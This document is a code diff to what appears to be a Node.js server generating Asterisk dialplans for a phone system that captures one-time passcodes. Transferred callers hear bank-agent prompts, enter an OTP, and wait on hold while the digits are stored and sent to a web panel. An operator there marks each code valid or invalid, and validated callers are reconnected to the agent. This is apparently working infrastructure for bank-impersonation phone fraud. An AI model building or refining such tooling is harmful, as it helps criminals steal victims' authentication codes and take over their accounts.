@@ -637,6 +637,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
+  // 2a. Extension Dedicada de Captura OTP al Transferir (Extension 7777 y 777)
   dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 7777)\n`;
   dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
@@ -644,12 +645,15 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
-  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
-  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 7777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 7777] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
   dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
@@ -658,30 +662,38 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
-  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
-  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/777)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 777] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
   dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
   dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
-  dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
-  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
-  dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=1001)\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(__IVR_AGENT_EXTEN=1001)\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
   dialplanContent += `; 2c. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
   dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
-  dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n`;
   dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
-  dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
   dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
@@ -742,31 +754,40 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${CALLERID(num)})})\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/7777)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/8888)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
 
   dialplanContent += ` ; Determinar audios para la extension 7777\n`;
   dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/default_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
 
   dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/8888_wait)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
 
   dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/8888_success)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
 
   dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/8888_failure)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
 
@@ -797,9 +818,18 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_codes/7777)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_captures/7777)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_codes/8888)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_captures/8888)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
   dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
-  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&callerid=\${CALLERID(num)}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
 
   dialplanContent += ` ; PASO DE ESPERA: Locucion 'Un momento por favor, estamos validando...'\n`;
   dialplanContent += ` same => n(espera_validacion),NoOp(=== [CAPTURA-7777] Reproduciendo audio de espera: \${AUDIO_WAIT} ===)\n`;
@@ -810,21 +840,38 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
   dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
   dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
-  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${CURRENT_STATUS}" = ""]?Set(CURRENT_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
-  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Ciclo \${WAIT_LOOP}/45 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
+  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
+  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, CID: \${CALLERID(num)}, Code: \${USER_DIGITS}) ===)\n`;
 
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
-  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 45]?codigo_aprobado)\n`;
+  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?codigo_aprobado)\n`;
 
-  dialplanContent += ` ; Cada 5 segundos un breve tono para mantener canal abierto y calmar al cliente\n`;
+  dialplanContent += ` ; Tono suave cada 5 segundos para mantener canal abierto\n`;
   dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
 
   dialplanContent += ` ; RAMA APROBADO: Asesor marco VALIDO en la web -> Locucion de exito y reconecta con el asesor\n`;
   dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-7777] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
@@ -834,6 +881,13 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-7777] TOKEN INVALIDO DETECTADO -> REINTENTANDO ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
   dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
 
@@ -952,8 +1006,13 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n(press1_transfer),NoOp(=== [IVR] PRESS 1 DETECTADO: TRANSFIRIENDO LLAMADA AL ASESOR ===)\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" != ""]?Playback(\${IVR_AGENT}):Playback(custom/conectar_asesor_banco))\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+  dialplanContent += ` same => n,Set(__LAST_AGENT=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR] MARCANDO EXTENSION DE AGENTE: \${FINAL_AGENT} ===)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += ` same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)\n`;
@@ -963,6 +1022,11 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => 1,1,NoOp(=== [IVR] PRESS 1 DIRECTO -> ASESOR 1001 ===)\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" != ""]?Playback(\${IVR_AGENT}):Playback(custom/conectar_asesor_banco))\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+  dialplanContent += ` same => n,Set(__LAST_AGENT=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -1348,12 +1412,15 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
     dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
-    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
-    dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
-    dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 7777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
+    dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 7777] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
     dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
     dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
@@ -1362,30 +1429,38 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
     dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
-    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
-    dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
-    dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/777)=\${FINAL_AGENT})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
